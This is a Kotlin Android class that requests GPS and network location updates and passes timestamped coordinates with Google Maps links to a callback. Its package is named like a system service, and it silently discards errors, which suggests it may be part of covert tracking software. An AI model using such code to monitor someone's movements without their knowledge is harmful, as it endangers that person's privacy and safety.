package com.system.service.monitor

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class LocationMonitor(
    private val context: Context,
    private val callback: (String) -> Unit
) {

    private var locationManager: LocationManager? = null
    private var lastLat: Double = 0.0
    private var lastLng: Double = 0.0

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            val dist = FloatArray(1)
            android.location.Location.distanceBetween(
                lastLat, lastLng, location.latitude, location.longitude, dist
            )
            // Log if moved more than 50 meters or if this is the first location
            if (dist[0] > 50 || lastLat == 0.0) {
                lastLat = location.latitude
                lastLng = location.longitude
                val ts = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                val url = "https://maps.google.com/?q=${location.latitude},${location.longitude}"
                val acc = String.format(Locale.US, "%.1f", location.accuracy)
                callback("[$ts] [LOCATION] \uD83D\uDCCD Lat: ${location.latitude}, Lng: ${location.longitude} | Acc: ${acc}m | $url")
            }
        }
        
        // These are required for backward compatibility below API 30
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    fun start() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            return
        }

        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        // Minimum time interval between updates: 5 minutes (300,000 ms)
        // Minimum distance between updates: 50 meters
        val minTime = 300000L
        val minDistance = 50f

        try {
            locationManager?.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                minTime,
                minDistance,
                locationListener
            )
        } catch (_: Exception) {}

        try {
            locationManager?.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                minTime,
                minDistance,
                locationListener
            )
        } catch (_: Exception) {}
    }

    fun stop() {
        try {
            locationManager?.removeUpdates(locationListener)
        } catch (_: Exception) {}
    }
}
